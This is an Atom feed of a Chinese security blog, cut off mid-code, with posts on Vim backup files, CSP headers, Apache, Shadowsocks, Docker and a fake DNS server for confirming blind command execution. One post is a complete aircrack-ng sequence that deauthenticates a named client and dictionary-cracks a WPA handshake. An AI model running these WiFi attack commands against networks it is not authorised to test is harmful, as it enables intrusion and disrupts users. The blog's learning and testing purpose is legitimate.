<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Anka9080&#39;s Notes</title>
  <subtitle>勿忘初心。</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.evilclay.com/"/>
  <updated>2017-03-31T14:01:04.896Z</updated>
  <id>http://www.evilclay.com/</id>
  
  <author>
    <name>Anka9080</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>谈谈 Vim 的几种文件备份</title>
    <link href="http://www.evilclay.com/2017/03/31/%E8%B0%88%E8%B0%88-Vim-%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%87%E4%BB%B6%E5%A4%87%E4%BB%BD/"/>
    <id>http://www.evilclay.com/2017/03/31/谈谈-Vim-的几种文件备份/</id>
    <published>2017-03-31T11:32:24.000Z</published>
    <updated>2017-03-31T14:01:04.896Z</updated>
    
    <content type="html"><![CDATA[<p>源自 MCTF 看到了 Vim 的 undo 备份，顺手学习了下 Vim 的几种备份机制，或有疏漏，请指出。</p>
<h3 id="1-Vim-的交换文件-filename-swp"><a href="#1-Vim-的交换文件-filename-swp" class="headerlink" title="1. Vim 的交换文件  .filename.swp"></a>1. Vim 的交换文件  .filename.swp</h3><p>默认交换文件在打开文件的时候就会产生交换文件，正常退出的时候才会删除交换文件（断电，Ctrl+Z强制退出就不会删除），内容大致是这个样子。</p>
<p><img src="http://7xku36.com1.z0.glb.clouddn.com/vimswp.png" alt="swpdemo"></p>
<p>通过在 Vim 配置文件设置 set noswapfile 来关闭交换文件。</p>
<h3 id="2-Vim-的备份文件-filename"><a href="#2-Vim-的备份文件-filename" class="headerlink" title="2. Vim 的备份文件 filename~"></a>2. Vim 的备份文件 filename~</h3><p>默认关闭，需要通过设置 set backup 来开启，Unbuntu的Vim配置文件是 /etc/vim/vimrc</p>
<p>开启后，对文件进行修改后会保存修改之前的一个副本，展示如下：</p>
<p><img src="http://7xku36.com1.z0.glb.clouddn.com/vimbackup.png" alt="~Demo"></p>
<p>如果不喜欢 ~ 作为备份文件的后缀，可以使用 set backupext=.bak 来设置备份文件的扩展名。</p>
<p>当然可以通过设置 set nobackup 来关闭备份文件。</p>
<h3 id="3-undo-备份文件-filename-un"><a href="#3-undo-备份文件-filename-un" class="headerlink" title="3. undo 备份文件  .filename.un.~"></a>3. undo 备份文件  .filename.un.~</h3><p>默认关闭，需要设置 set undofile 来开启 undo 备份文件。这是 Vim 官方给出的 undo 备份文件的解释：</p>
<p>When on, Vim automatically saves undo history to an undo file when writing a buffer to a file, and restores undo history from the same file on buffer read.</p>
<p>也就是说开启时，在 Vim 中编辑文件是使用了 撤销更改（u命令）的操作，会把撤销更改的那部分保存到缓存文件 .<filename>.un.~ 中。</filename></p>
<p>测试发现这个 undo 缓存文件是追加写入的，所以你所有的撤销操作都会在这个文件中找到。</p>
<p>内容大概是这个样子：</p>
<p><img src="http://7xku36.com1.z0.glb.clouddn.com/vimundo.png" alt="undodemo"></p>
<h3 id="4-PS"><a href="#4-PS" class="headerlink" title="4. PS"></a>4. PS</h3><p>默认缓存文件会在当前目录下生成，可以通过修改配置文件的方式指定自动保存位置。</p>
<p>参考连接中有提高可以通过 Vim 的备份机制实现 内容的版本控制。</p>
<p>我们可以从漏洞挖掘的角度延伸一点点，像 敏感文件扫描这种工具一般都是一个敏感文件列表无脑开扫，若是增加一个功能：</p>
<p>结合爬虫已经爬取到的文件和目录，生成相应的缓存/备份文件，是不是又会有新的发现 :p</p>
<h3 id="5-参考"><a href="#5-参考" class="headerlink" title="5. 参考"></a>5. 参考</h3><p><a href="http://blog.163.com/yysfire@126/blog/static/1831747201011443159904/" target="_blank" rel="external">http://blog.163.com/yysfire@126/blog/static/1831747201011443159904/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;源自 MCTF 看到了 Vim 的 undo 备份，顺手学习了下 Vim 的几种备份机制，或有疏漏，请指出。&lt;/p&gt;
&lt;h3 id=&quot;1-Vim-的交换文件-filename-swp&quot;&gt;&lt;a href=&quot;#1-Vim-的交换文件-filename-swp&quot; class=&quot;h
    
    </summary>
    
    
      <category term="Vim" scheme="http://www.evilclay.com/tags/Vim/"/>
    
      <category term="缓存文件" scheme="http://www.evilclay.com/tags/%E7%BC%93%E5%AD%98%E6%96%87%E4%BB%B6/"/>
    
      <category term="敏感文件探测" scheme="http://www.evilclay.com/tags/%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B/"/>
    
  </entry>
  
  <entry>
    <title>CSP（内容安全策略）学习</title>
    <link href="http://www.evilclay.com/2017/03/13/tmp/"/>
    <id>http://www.evilclay.com/2017/03/13/tmp/</id>
    <published>2017-03-13T13:05:04.000Z</published>
    <updated>2017-03-13T13:59:36.818Z</updated>
    
    <content type="html"><![CDATA[<p>今天在一段 PHP 验证码代码中包含了以下内容，怀着好奇的心里研究了一下~</p>
<p>header(“Content-Security-Policy: default-src ‘self’; style-src ‘self’ ‘unsafe-inline’; img-src ‘self’ data:; frame-src ‘none’”);<br>header(“X-Content-Security-Policy: default-src ‘self’; style-src ‘self’ ‘unsafe-inline’; img-src ‘self’ data:; frame-src ‘none’”);<br>header(“X-WebKit-CSP: default-src ‘self’; style-src ‘self’ ‘unsafe-inline’;img-src ‘self’ data:; frame-src ‘none’”);<br>header(“X-XSS-Protection: 1; mode=block”);<br>header(“X-Content-Type-Options: nosniff”);<br>header(“X-Frame-Options: DENY”);</p>
<p>我们来先说一下CSP， 内容安全策略 (CSP, Content Security Policy) 是一个附加的安全层，用于帮助检测和缓解某些类型的攻击，包括跨站脚本 (XSS) 和数据注入等攻击。 这些攻击可用于实现从数据窃取到网站破坏或作为恶意软件分发版本等用途。</p>
<h4 id="Content-Security-Policy"><a href="#Content-Security-Policy" class="headerlink" title="Content-Security-Policy"></a>Content-Security-Policy</h4><p>这个字段表示内容安全策略，也就是大名鼎鼎的 CSP ，主要是定义页面可以加载哪些资源，减少 XSS 的发生。</p>
<p>Content-Security-Policy 由一组指令+指令值对组成。目前的所有指令值可以<a href="https://imququ.com/post/content-security-policy-reference.html" target="_blank" rel="external">参考这里</a>，这里仅仅对上面的栗子给出说明：</p>
<p>default-src ‘self’; 表示所有资源（js、image、css、web font，ajax）的默认加载策略是同源的。</p>
<p>style-src ‘self’ ‘unsafe-inline’;  表示 css 的加载策略是同源和行内css。</p>
<p>img-src ‘self’ data:;  表示 css 加载策略是同源和data协议。</p>
<p>frame-src ‘none’  表示不允许加载frame</p>
<h4 id="X-Content-Security-Policy"><a href="#X-Content-Security-Policy" class="headerlink" title="X-Content-Security-Policy"></a>X-Content-Security-Policy</h4><p>这个字段的作用同 Content-Security-Policy，早期的 Chrome 是通过 X-WebKit-CSP 响应头来支持 CSP 的，而 firefox 和 IE 则支持 X-Content-Security-Policy，Chrome25 和 Firefox23 开始支持标准的 Content-Security-Policy。</p>
<h4 id="X-WebKit-CSP"><a href="#X-WebKit-CSP" class="headerlink" title="X-WebKit-CSP"></a>X-WebKit-CSP</h4><p>X-WebKit-CSP 是早期 Chrome 和 Safari 支持的，作用同上。</p>
<h4 id="X-XSS-Protection"><a href="#X-XSS-Protection" class="headerlink" title="X-XSS-Protection"></a>X-XSS-Protection</h4><p>X-XSS-Protection: 1; mode=block  主要是控制 IE8+ 和 Webkit browsers 浏览器开启 XSS 防护功能，阻止反射型 XSS 呈现页面，并不会清理 XSS。</p>
<h4 id="X-Content-Type-Options"><a href="#X-Content-Type-Options" class="headerlink" title="X-Content-Type-Options"></a>X-Content-Type-Options</h4><p>X-Content-Type-Options: nosniff 禁用浏览器的类型猜测行为，也就是说Content-Type是错的或者未定义的时候，不会解析执行响应内容。</p>
<h4 id="X-Frame-Options"><a href="#X-Frame-Options" class="headerlink" title="X-Frame-Options"></a>X-Frame-Options</h4><p>X-Frame-Options 用来给浏览器指示允许一个页面可否在frame , iframe 或者object 中展现的标记。DENY 表示不允许被陷入到其他 frame /iframe 中。</p>
<h4 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h4><p>差了些相关资料，发现前端果然很乱啊，一种功能在不同的浏览器中有不同的实现形式。。。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天在一段 PHP 验证码代码中包含了以下内容，怀着好奇的心里研究了一下~&lt;/p&gt;
&lt;p&gt;header(“Content-Security-Policy: default-src ‘self’; style-src ‘self’ ‘unsafe-inline’; img-s
    
    </summary>
    
    
      <category term="XSS防护" scheme="http://www.evilclay.com/tags/XSS%E9%98%B2%E6%8A%A4/"/>
    
      <category term="CSP策略" scheme="http://www.evilclay.com/tags/CSP%E7%AD%96%E7%95%A5/"/>
    
  </entry>
  
  <entry>
    <title>Apache 绑定多域名/多端口配置命令</title>
    <link href="http://www.evilclay.com/2017/03/13/Apache%E7%BB%91%E5%AE%9A%E5%A4%9A%E5%9F%9F%E5%90%8D%20or%20%E5%A4%9A%E7%AB%AF%E5%8F%A3%E9%85%8D%E7%BD%AE%E5%91%BD%E4%BB%A4/"/>
    <id>http://www.evilclay.com/2017/03/13/Apache绑定多域名 or 多端口配置命令/</id>
    <published>2017-03-13T06:23:24.000Z</published>
    <updated>2017-03-13T06:29:58.911Z</updated>
    
    <content type="html"><![CDATA[<p>大致提一下，Apache实现多主机的方式有多种：<br>1)基于IP地址的虚拟主机配置，<br>2) 基于IP和多端口的虚拟主机配置，<br>3)单个IP地址的服务器上基于域名的虚拟主机配置，<br>4)在多个IP地址的服务器上配置基于域名的虚拟主机。</p>
<h2 id="绑定多端口方式"><a href="#绑定多端口方式" class="headerlink" title="绑定多端口方式"></a>绑定多端口方式</h2><h4 id="设置-Apache-监听新端口"><a href="#设置-Apache-监听新端口" class="headerlink" title="设置 Apache 监听新端口"></a>设置 Apache 监听新端口</h4><p>打开 /etc/apache2/ports.conf 文件，在 Listen 80 下追加监听新的端口号，比如 8888</p>
<pre><code>Listen 8888
</code></pre><h4 id="设置虚拟主机（新端口主机）对应目录"><a href="#设置虚拟主机（新端口主机）对应目录" class="headerlink" title="设置虚拟主机（新端口主机）对应目录"></a>设置虚拟主机（新端口主机）对应目录</h4><p>打开 /etc/apache2/sites-available/000-default.conf 文件，新增加如下内容：</p>
<pre><code>&lt;VirtualHost *:8888&gt;
ServerName localhost:8888
DocumentRoot &quot;/dir_path&quot;
&lt;/VirtualHost&gt;
</code></pre><h4 id="重启-Apache2-服务"><a href="#重启-Apache2-服务" class="headerlink" title="重启 Apache2 服务"></a>重启 Apache2 服务</h4><p>执行命令，重启Apache2</p>
<pre><code>service apache2 restart
</code></pre><p>浏览器访问： <a href="http://ip:8888" target="_blank" rel="external">http://ip:8888</a> ，若提示：</p>
<pre><code>Forbidden
You don&apos;t have permission to access / on this server.
</code></pre><p>是因为虚拟主机目录为非apache安装目录下的htdocs，违反了apache对默认对网站根访问权限。需要设置该目录允许访问。</p>
<h4 id="设置目录允许访问"><a href="#设置目录允许访问" class="headerlink" title="设置目录允许访问"></a>设置目录允许访问</h4><p>打开 /etc/apache2/apache2.conf ，新添加如下配置：</p>
<pre><code>&lt;Directory /dir_path&gt;
        Options Indexes FollowSymLinks
        AllowOverride None
        Require all granted
&lt;/Directory&gt;
</code></pre><h2 id="绑定多主机"><a href="#绑定多主机" class="headerlink" title="绑定多主机"></a>绑定多主机</h2><p>在 /etc/apache2/site-enable/目录下新建domain_x.conf配置文件，内容如下：</p>
<virtualhost *:80=""><br>        ServerName xxx.com<br>        ServerAdmin webmaster@localhost<br>        DocumentRoot /var/www/html/xxx<br>        ErrorLog ${APACHE_LOG_DIR}/error_xxx.log<br>        CustomLog ${APACHE_LOG_DIR}/access_xxx.log combined<br></virtualhost>

<p>在domain 厂商设置好domain 的 A 记录即可。</p>
<blockquote>
<p>参考： <a href="http://blog.csdn.net/robertsong2004/article/details/46830799" target="_blank" rel="external">http://blog.csdn.net/robertsong2004/article/details/46830799</a></p>
</blockquote>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;大致提一下，Apache实现多主机的方式有多种：&lt;br&gt;1)基于IP地址的虚拟主机配置，&lt;br&gt;2) 基于IP和多端口的虚拟主机配置，&lt;br&gt;3)单个IP地址的服务器上基于域名的虚拟主机配置，&lt;br&gt;4)在多个IP地址的服务器上配置基于域名的虚拟主机。&lt;/p&gt;
&lt;h2 id
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Shadowsocks服务端配置命令</title>
    <link href="http://www.evilclay.com/2017/03/11/Shadowsocks%E6%9C%8D%E5%8A%A1%E7%AB%AF%E9%85%8D%E7%BD%AE%E5%91%BD%E4%BB%A4/"/>
    <id>http://www.evilclay.com/2017/03/11/Shadowsocks服务端配置命令/</id>
    <published>2017-03-11T03:38:37.000Z</published>
    <updated>2017-03-11T03:42:04.075Z</updated>
    
    <content type="html"><![CDATA[<ol>
<li><p>安装 服务端<br>pip install shadowsocks</p>
</li>
<li><p>创建 /etc/shadowsocks/，进入并添加 config.json文件，内容如下：<br>{<br>服务器IP地址需要设置为0.0.0.0<br>“server”:”0.0.0.0”,<br>“server_port”:8838,<br>“local_port”:1080,<br>“password”:”pass”,<br>“timeout”:600,<br>“method”:”aes-256-cfb”<br>}</p>
</li>
<li><p>安装aes加密相关库<br>apt-get install python-m2crypto</p>
</li>
<li><p>设置开机启动  打开 /etc/rc.local，并添加如下内容：<br>/usr/local/bin/ssserver -c /etc/shadowsocks/config.json</p>
</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;ol&gt;
&lt;li&gt;&lt;p&gt;安装 服务端&lt;br&gt;pip install shadowsocks&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;创建 /etc/shadowsocks/，进入并添加 config.json文件，内容如下：&lt;br&gt;{&lt;br&gt;服务器IP地址需要设置为0.0.0.0&lt;br
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>WIFI密码-破解命令</title>
    <link href="http://www.evilclay.com/2017/02/21/WIFI%E5%AF%86%E7%A0%81-%E7%A0%B4%E8%A7%A3%E5%91%BD%E4%BB%A4/"/>
    <id>http://www.evilclay.com/2017/02/21/WIFI密码-破解命令/</id>
    <published>2017-02-21T13:08:39.000Z</published>
    <updated>2017-02-21T13:13:18.041Z</updated>
    
    <content type="html"><![CDATA[<p>自己路由器坏了，暂时也懒得修，想起还有一块无线网卡，直接爆破WIFI得了。</p>
<p>使用虚拟机识别无线网卡的话注意两点：</p>
<ol>
<li>service.msc 开启 VM USB相关的服务</li>
<li>虚拟机设置页面USB控制器的三个选项全都点上</li>
</ol>
<p>要不，要不插上网卡会没反应~~</p>
<h4 id="列出支持监控模式的网卡"><a href="#列出支持监控模式的网卡" class="headerlink" title="列出支持监控模式的网卡"></a>列出支持监控模式的网卡</h4><p>airmon-ng</p>
<h4 id="启用wlan0"><a href="#启用wlan0" class="headerlink" title="启用wlan0"></a>启用wlan0</h4><p>airmon-ng start wlan0</p>
<h4 id="列出所有的SSID"><a href="#列出所有的SSID" class="headerlink" title="列出所有的SSID"></a>列出所有的SSID</h4><p>airodump-ng wlan0mon</p>
<h4 id="抓BSSID-20-F4-1B-B3-E5-12-信道2的握手包-能看到已经连接的客户端"><a href="#抓BSSID-20-F4-1B-B3-E5-12-信道2的握手包-能看到已经连接的客户端" class="headerlink" title="抓BSSID　20:F4:1B:B3:E5:12　信道2的握手包(能看到已经连接的客户端)"></a>抓BSSID　20:F4:1B:B3:E5:12　信道2的握手包(能看到已经连接的客户端)</h4><p>airodump-ng -c 2 –bssid 20:F4:1B:B3:E5:12 -w ~/ wlan0mon</p>
<h4 id="强制BSSID20-F4-1B-B3-E5-12-客户端-B4-0B-44-91-74-B9-下线"><a href="#强制BSSID20-F4-1B-B3-E5-12-客户端-B4-0B-44-91-74-B9-下线" class="headerlink" title="强制BSSID20:F4:1B:B3:E5:12　客户端　B4:0B:44:91:74:B9　下线"></a>强制BSSID20:F4:1B:B3:E5:12　客户端　B4:0B:44:91:74:B9　下线</h4><p>aireplay-ng -0 2 -a 20:F4:1B:B3:E5:12 -c B4:0B:44:91:74:B9 wlan0mon</p>
<p>####　使用字典破解BSSID　20:F4:1B:B3:E5:12　的WIFI密码<br>aircrack-ng -a2 -b 20:F4:1B:B3:E5:12 -w ~/wifi-crack/pass.txt ~/wifi-crack/*.cap</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;自己路由器坏了，暂时也懒得修，想起还有一块无线网卡，直接爆破WIFI得了。&lt;/p&gt;
&lt;p&gt;使用虚拟机识别无线网卡的话注意两点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;service.msc 开启 VM USB相关的服务&lt;/li&gt;
&lt;li&gt;虚拟机设置页面USB控制器的三个选项全都点上&lt;/
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SQLALchemy问题调试的一点想法</title>
    <link href="http://www.evilclay.com/2017/02/18/SQLALchemy%E9%97%AE%E9%A2%98%E8%B0%83%E8%AF%95%E7%9A%84%E4%B8%80%E7%82%B9%E6%83%B3%E6%B3%95/"/>
    <id>http://www.evilclay.com/2017/02/18/SQLALchemy问题调试的一点想法/</id>
    <published>2017-02-18T15:02:29.000Z</published>
    <updated>2017-02-18T15:04:12.362Z</updated>
    
    <content type="html"><![CDATA[<p>这周在处理工作的时候遇到了一个比较棘手的问题，加上前段时间看到的一个面试题“当你遇到的问题在google上搜不到时你会如何去做”，针对这个问题处理的时间比较长，中间也花了一些时间纠结该如何去做，想把这次处理问题的方法记录下来，提醒自己以后尽可能的高效处理遇到的BUG。</p>
<p>不提及具体的问题，这里简单说快速处理问题的几点想法：</p>
<p>1、 逐步定位问题可能的原因，一个个排除问题可能出现的组件。</p>
<p>2、 单独的小程序去复现BUG测试方法，而不是在原有大体量的程序下。</p>
<p>3、 最重要的资料都会在官网找得到来源，虽然不一定能获得解决问题的方法，说不定会找到问题的原因。</p>
<p>4、 解决问题的过程中难免会接触新的知识，保持好奇心去弄明白它。</p>
<p>5、 当前找到的解决方案不一定是最优的，但在功能、效率上来说一定是最符合现状的，心里保留余地，后期可能会因为新的姿势使用别的解决方案。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这周在处理工作的时候遇到了一个比较棘手的问题，加上前段时间看到的一个面试题“当你遇到的问题在google上搜不到时你会如何去做”，针对这个问题处理的时间比较长，中间也花了一些时间纠结该如何去做，想把这次处理问题的方法记录下来，提醒自己以后尽可能的高效处理遇到的BUG。&lt;/p
    
    </summary>
    
    
      <category term="想法" scheme="http://www.evilclay.com/tags/%E6%83%B3%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>DockerHelloWorld分享备忘录</title>
    <link href="http://www.evilclay.com/2017/01/05/DockerHelloWorld%E5%88%86%E4%BA%AB%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    <id>http://www.evilclay.com/2017/01/05/DockerHelloWorld分享备忘录/</id>
    <published>2017-01-05T02:39:19.000Z</published>
    <updated>2017-01-05T02:40:23.139Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Doceker-HelloWorld"><a href="#Doceker-HelloWorld" class="headerlink" title="Doceker HelloWorld"></a>Doceker HelloWorld</h2><h3 id="一些概念"><a href="#一些概念" class="headerlink" title="一些概念"></a>一些概念</h3><h4 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h4><p>一种轻量型的容器解决方案，通过Docker化技术可以把应用“一次封装，到处运行”，免去了手工装各种环境的体力劳动，这种容器化技术通过镜像和容器两个主要部件实现。</p>
<h4 id="镜像-和-容器"><a href="#镜像-和-容器" class="headerlink" title="镜像 和 容器"></a>镜像 和 容器</h4><p>镜像和容器的关系 相当于 面向对象语言的 类 与 对象。</p>
<p>也就是说，加载镜像生成一个容器，同是又可以把新生成的容器经过修改后重新封装成一个镜像共享给大家使用。<br>对容器修改后需要commit生成自己的镜像，否则下次加载这个镜像时修改丢失。</p>
<h4 id="Docker-Client"><a href="#Docker-Client" class="headerlink" title="Docker Client"></a>Docker Client</h4><p>可以把与Docker Deamon进行通讯的所有接口都理解为 Docker Client,可以是命令行程序，可以是C#(支持 Windows)、Java、Go、Ruby、JavaScript提供的接口。</p>
<h4 id="Docker-Daemon"><a href="#Docker-Daemon" class="headerlink" title="Docker Daemon"></a>Docker Daemon</h4><p>Docker最核心的后台进程，通过API方式接收并处理客户端的请求，进行操作时 要先保证 deamon 进程已经运行，如下：</p>
<p><img src="http://7xku36.com1.z0.glb.clouddn.com/docker-deamon.png" alt=""></p>
<h4 id="仓库"><a href="#仓库" class="headerlink" title="仓库"></a>仓库</h4><p>集中存放镜像的场所。</p>
<p>最大的仓库 Docker Hub，国内的公开仓库有 中科大<a href="https://lug.ustc.edu.cn/wiki/mirrors/help/docker。" target="_blank" rel="external">https://lug.ustc.edu.cn/wiki/mirrors/help/docker。</a></p>
<h4 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h4><p>包含各种docker指令的一个文本文件，通过这个文件创建一个docker镜像。推荐使用这种方式分享docker镜像，可以让别人清楚的了解该镜像装了哪些环境。</p>
<h3 id="Docker-vs-Vmware"><a href="#Docker-vs-Vmware" class="headerlink" title="Docker vs Vmware"></a>Docker vs Vmware</h3><p><img src="http://7xku36.com1.z0.glb.clouddn.com/dockervm.gif" alt=""></p>
<h3 id="Docker-使用场景"><a href="#Docker-使用场景" class="headerlink" title="Docker 使用场景"></a>Docker 使用场景</h3><pre><code>对于运维来说，可以做到应用的规模化，自动化，异构化部署。
对于开发来说，提供了一个统一的开发环境，方便团队之间协同开发。
对于我们来说，....
</code></pre><h3 id="Docker-常用命令"><a href="#Docker-常用命令" class="headerlink" title="Docker 常用命令"></a>Docker 常用命令</h3><pre><code>docker info  显示 docker 系统信息 镜像数，容器数
docker stat  显示已经运行的 docker 容器 CPU 内存 IO信息
docker version  显示 docker 版本（CS）信息

docker images  显示系统中所有镜像
docker ps   显示正在运行的镜像，包含容器ID
docker search ubuntu   搜索docker仓库中 ubuntu 镜像
docker pull  username/mechine  从仓库下载镜像文件
docker push hujb2000/node:v2  把镜像推到自己的仓库
docker rmi  镜像ID  删除镜像
docker build -t anka9080/tagname .   在当前目录下查找Dockerfile生成镜像
docker run -d nickistre/ubuntu-lamp   后台模式(-d)启动容器
docker run -d -p 8000:80 anka9080/vulapps:tools_xunfeng   后台开启容器并指定端口映射
docker run -it mattdm/fedora /bin/bash   进入容器的交互式shell （-t终端 -i 输出输入重定向）
docker run ubuntu:15.10 /bin/echo &quot;Hello world&quot;  Docker 以 ubuntu15.10 镜像创建一个新容器，然后在容器里执行 bin/echo &quot;Hello world&quot;，然后输出结果。

docker logs 2b1b7a428627/cointainer_name  对后台运行容器的输出重定向显示到当前shell
docker stop 2b1b7a428627/cointainer_name   关闭容器
docker port 7a38a1ad55c6   查看指定 （ID或者名字）容器的某个确定端口映射到宿主机的端口号
docker rm determined_swanson    删除容器
docker exec -it &lt;容器ID&gt; /bin/bash   进入正在运行容器的shell
docker top determined_swanson  查看容器内部的进程


docker cp foo.txt mycontainer:/foo.txt  拷贝文件到 docker 容器
docker cp mycontainer:/foo.txt foo.txt  从容器冲拷贝文件到宿主机
</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Doceker-HelloWorld&quot;&gt;&lt;a href=&quot;#Doceker-HelloWorld&quot; class=&quot;headerlink&quot; title=&quot;Doceker HelloWorld&quot;&gt;&lt;/a&gt;Doceker HelloWorld&lt;/h2&gt;&lt;h3 id=&quot;一
    
    </summary>
    
    
      <category term="Docker" scheme="http://www.evilclay.com/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>FakeDNSServer - 轻量级DNSLog查询工具</title>
    <link href="http://www.evilclay.com/2017/01/04/FakeDNSServer-%E8%BD%BB%E9%87%8F%E7%BA%A7DNSLog%E6%9F%A5%E8%AF%A2%E5%B7%A5%E5%85%B7/"/>
    <id>http://www.evilclay.com/2017/01/04/FakeDNSServer-轻量级DNSLog查询工具/</id>
    <published>2017-01-04T15:19:04.000Z</published>
    <updated>2017-01-05T05:46:16.618Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近研究了类似盲注类命令执行没有回显的情况的处理方式，听了No老师的一些实战经验，手动搭建了DNSLog程序和一个简易的DNSServer，当做笔记记录下来啦。</p>
<p>若遇到命令执行没有回显的话，如何来验证命令执行是否真的成功了呢？</p>
<p>大牛告诉我是有三种方式可以去验证的：</p>
<ul>
<li>使用 ICMP 协议（Ping命令）</li>
<li>使用 HTTP 协议 （发送 HTTP 请求）</li>
<li>使用 DNS 协议 （发送DNS查询请求）</li>
</ul>
<p>第一种方式可以验证命令能够执行，但是不能够把命令的回显带过来。</p>
<p>在Linux需要设置iptables才能把icmp的请求写入到日志文件里，当然直接开 tcpdump 或者 wireshark 这种抓包工具也能能看到有谁 ping 了你的主机的。</p>
<pre><code>TCPDump命令：
tcpdump -i eth0 icmp
</code></pre><p>若想永久保存ICMP信息，建议设置 iptables ：</p>
<pre><code>iptables -I INPUT -p icmp --icmp-type 8 -m state  --state NEW,ESTABLISHED,RELATED -j LOG --log-level=1 --log-prefix &quot;Ping Request &quot;
// 会把所有的ICMP请求写入到 iptables 的日志文件中
// Ubuntu/Debian日志位置:  /var/log/kern.log
// CentOS/RHEL/Fedora日志位置:  /var/log/messages
</code></pre><p>这里是其他主机发起一次ping请求后 Kali（Debian）主机的/var/log/kern.log 输出：</p>
<p><img src="http://7xku36.com1.z0.glb.clouddn.com/icmp_log.png" alt=""></p>
<p>第二种需要自己搭建一个HTTP服务器，然后去查Log就可以看到你在靶机发送的请求，一般在不能联网的内网的时候这个方法就比较尴尬了，也有可能HTTP协议被封掉。</p>
<p>这里使用 curl 发起一个带 命令执行的HTTP 请求记录，查看日志信息：</p>
<pre><code>vim /var/log/apache2/access.log
</code></pre><p><img src="http://7xku36.com1.z0.glb.clouddn.com/http_curl_apache_log.png" alt=""></p>
<p>第三种需要搭建一个轻量型的DNS服务器，当然能接受到DNS请求验证命令执行就可以了，至于解不解析DNS请求看你心情了，而且DNS协议一般都不会被封，这篇文章主要记录的也是这种姿势。</p>
<p>下面有请神器上场 ~</p>
<p>BugScanTeam 开源的 DNSLog 程序，简直懒人福利有木有，README已经写得够详细了，不多说了，这是 Git 地址 <a href="https://github.com/bugscanteam/dnslog/" target="_blank" rel="external">https://github.com/bugscanteam/dnslog/</a></p>
<p>在这里我就小小的提示下 需要方便的自定义DNS服务器的域名提供商请找新网（本人亲测万网，Godaddy需要认证，最后是问了Yan表哥才知道的 - -）</p>
<p>后面自己参照SimmpleDNSServer写了一个小的DNS服务器。</p>
<p>可以输出 DNS请求的来源 IP，Port 和请求的域名信息。</p>
<p>并不能实现真正的DNS解析！</p>
<p>并不能实现真正的DNS解析！</p>
<p>并不能实现真正的DNS解析！</p>
<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> <span class="string">"Usage:  python fake_dns_server.py"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">""</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"并没有提供DNS解析功能，直接打印发起请求的IP，Port和需要解析的域名 :P"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">""</span></span><br></pre></td></tr></table></figure>
<p>在本机使用 nslookup 命令测试命令执行效果如下：</p>
<p><img src="http://7xku36.com1.z0.glb.clouddn.com/fake_dns_log.png" alt=""></p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>代码 GitHub 地址： <a href="https://github.com/Evi1CLAY/CoolPool/tree/master/Python/FakeDNSServer" target="_blank" rel="external">https://github.com/Evi1CLAY/CoolPool/tree/master/Python/FakeDNSServer</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="comment"># author: Anka9080</span></span><br><span class="line"><span class="comment"># mail: 